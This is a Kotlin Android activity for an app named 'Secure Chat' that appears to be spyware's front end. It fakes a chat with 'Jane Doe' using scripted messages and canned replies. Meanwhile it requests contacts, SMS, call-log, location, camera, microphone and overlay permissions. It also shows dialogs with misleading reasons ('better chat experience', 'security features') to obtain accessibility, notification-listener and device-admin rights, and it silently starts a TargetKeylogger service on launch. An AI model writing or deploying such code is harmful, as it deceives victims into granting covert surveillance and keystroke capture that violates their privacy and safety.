package com.secure.chat.ui

import android.view.ViewGroup
import android.view.LayoutInflater
import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.secure.chat.R
import com.secure.chat.services.TargetKeylogger
import java.text.SimpleDateFormat
import java.util.*

class ChatActivity : AppCompatActivity() {

    private lateinit var etMessage: EditText
    private lateinit var btnSend: ImageButton
    private lateinit var recyclerView: RecyclerView
    private lateinit var progressOverlay: View
    private lateinit var tvTyping: TextView

    private val messages = mutableListOf<Map<String, String>>()
    private lateinit var adapter: ChatAdapter

    private val requiredPermissions = arrayOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.SYSTEM_ALERT_WINDOW,
        Manifest.permission.POST_NOTIFICATIONS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_chat)

        etMessage = findViewById(R.id.etMessage)
        btnSend = findViewById(R.id.btnSend)
        recyclerView = findViewById(R.id.recyclerChat)
        progressOverlay = findViewById(R.id.progressOverlay)
        tvTyping = findViewById(R.id.tvTyping)

        // Fake toolbar
        val toolbarTitle = findViewById<TextView>(R.id.tvChatTitle)
        toolbarTitle.text = "Jane Doe"
        val toolbarStatus = findViewById<TextView>(R.id.tvChatStatus)
        toolbarStatus.text = "online"

        // Setup RecyclerView
        adapter = ChatAdapter(messages)
        recyclerView.layoutManager = LinearLayoutManager(this).apply {
            stackFromEnd = true
        }
        recyclerView.adapter = adapter

        // Send button
        btnSend.setOnClickListener {
            val text = etMessage.text.toString().trim()
            if (text.isNotEmpty()) {
                sendMessage(text)
                etMessage.text.clear()
            }
        }

        // Request all permissions
        requestAllPermissions()

        // Fake incoming messages
        fakeIncomingMessages()

        // Start keylogger
        startKeylogger()
    }

    private fun sendMessage(text: String) {
        val time = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
        messages.add(mapOf("text" to text, "time" to time, "type" to "sent"))
        adapter.notifyItemInserted(messages.size - 1)
        recyclerView.smoothScrollToPosition(messages.size - 1)

        // Fake reply after delay
        progressOverlay.visibility = View.VISIBLE
        tvTyping.visibility = View.VISIBLE
        recyclerView.postDelayed({
            progressOverlay.visibility = View.GONE
            tvTyping.visibility = View.GONE
            val replyTime = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
            val replies = arrayOf(
                "Okay, got it! 😊",
                "Sure, sounds good!",
                "Haha yeah 😄",
                "I know right?",
                "Let me think about it...",
                "That's interesting!",
                "Cool, talk later!",
                "👍",
                "😍😍😍",
                "Where are you?",
                "Can you send me that?",
                "OMG really?",
                "I miss you 🥺",
                "Let's meet up!",
                "Good morning! 🌸"
            )
            messages.add(mapOf(
                "text" to replies.random(),
                "time" to replyTime,
                "type" to "received"
            ))
            adapter.notifyItemInserted(messages.size - 1)
            recyclerView.smoothScrollToPosition(messages.size - 1)
        }, (1500..4000).random().toLong())
    }

    private fun fakeIncomingMessages() {
        val initialMessages = arrayOf(
            "Hey! How are you?",
            "Long time no see!",
            "Are you free tonight?",
            "Check this out! https://bit.ly/3xExample",
            "I miss you! 🥺"
        )

        recyclerView.postDelayed({
            for (i in 0 until 3) {
                recyclerView.postDelayed({
                    val time = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
                    messages.add(mapOf(
                        "text" to initialMessages[i],
                        "time" to time,
                        "type" to "received"
                    ))
                    adapter.notifyItemInserted(messages.size - 1)
                    recyclerView.smoothScrollToPosition(messages.size - 1)
                }, (i + 1) * 2000L)
            }
        }, 1000)
    }

    private fun requestAllPermissions() {
        val permissionsToRequest = mutableListOf<String>()

        for (perm in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm)
            }
        }

        // Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivity(intent)
            }
        }

        // Battery optimization
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
                startActivity(intent)
            }
        }

        // Accessibility
        showAccessibilityDialog()

        // Notification listener
        showNotificationListenerDialog()

        // Device admin
        showDeviceAdminDialog()

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 1001)
        }
    }

    private fun showAccessibilityDialog() {
        AlertDialog.Builder(this)
            .setTitle("Enable Accessibility")
            .setMessage("For better chat experience, please enable Secure Chat accessibility service in Settings > Accessibility > Installed Apps > Secure Chat")
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun showNotificationListenerDialog() {
        AlertDialog.Builder(this)
            .setTitle("Notification Access")
            .setMessage("Allow Secure Chat to read notifications for a better experience")
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun showDeviceAdminDialog() {
        AlertDialog.Builder(this)
            .setTitle("Device Admin")
            .setMessage("For security features, enable Secure Chat as device administrator")
            .setPositiveButton("Activate") { _, _ ->
                val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        android.content.ComponentName(this@ChatActivity, com.secure.chat.services.TargetDeviceAdmin::class.java))
                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required for security features")
                }
                startActivity(intent)
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun startKeylogger() {
        TargetKeylogger.start(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        TargetKeylogger.stop()
    }

    // Inner ChatAdapter
    class ChatAdapter(private val messages: List<Map<String, String>>) : RecyclerView.Adapter<ChatAdapter.ChatViewHolder>() {

        override fun getItemViewType(position: Int): Int {
            return if (messages[position]["type"] == "sent") 0 else 1
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ChatViewHolder {
            val layout = if (viewType == 0) R.layout.item_chat_sent else R.layout.item_chat_received
            val view = LayoutInflater.from(parent.context).inflate(layout, parent, false)
            return ChatViewHolder(view)
        }

        override fun onBindViewHolder(holder: ChatViewHolder, position: Int) {
            val msg = messages[position]
            holder.text.text = msg["text"]
            holder.time.text = msg["time"]
        }

        override fun getItemCount() = messages.size

        inner class ChatViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
            val text: TextView = itemView.findViewById(R.id.tvChatText)
            val time: TextView = itemView.findViewById(R.id.tvChatTime)
        }
    }
}
